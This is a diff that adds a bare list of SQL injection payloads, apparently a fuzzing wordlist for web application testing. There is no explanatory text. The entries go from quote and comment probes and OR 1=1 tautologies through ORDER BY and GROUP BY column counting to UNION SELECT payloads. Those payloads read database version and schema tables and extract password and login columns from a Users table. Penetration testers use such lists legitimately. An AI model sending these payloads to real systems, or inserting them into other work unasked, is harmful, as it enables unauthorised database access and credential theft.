@@ -1,0 +1,50 @@
+'
+''
+`
+``
+,
+"
+""
+/
+//
+\
+\\
+;
+' or "
+-- or # 
+' OR '2
+' OR 1 -- -
+" OR "" = "
+" OR 1 = 1 -- -
+' OR '' = '
+'='
+'LIKE'
+'=0--+
+ OR 1=1
+' OR 'x'='x --
+' AND id IS NULL; --
+'''''''s''''''UNION SELECT '2
+AND 1
+AND 0
+AND true
+AND false
+1-false
+1-true
+1*56
+-2
+1' ORDER BY 1--+
+1' ORDER BY 2--+
+1' ORDER BY 3--+
+1' ORDER BY 1,2--+
+1' ORDER BY 1,2,3--+
+1' GROUP BY 1,2,--+
+1' GROUP BY 1,2,3--+
+' GROUP BY 
+-1' UNION SELECT 1,2,3--+
+1' UNION SELECT 4,2;- -
+UNION SELECT 1,@@version;- -
+1' UNION SELECT 1,Users FROM information_schema.tables;- -
+1' union SELECT VERSION(),1 from information_schema.tables -- //
+' UNION SELECT password,login from Users --  
+'' UNION SELECT name from sqlite_master --
+' UNION SELECT name,login from Users WHERE ID=2 -- 
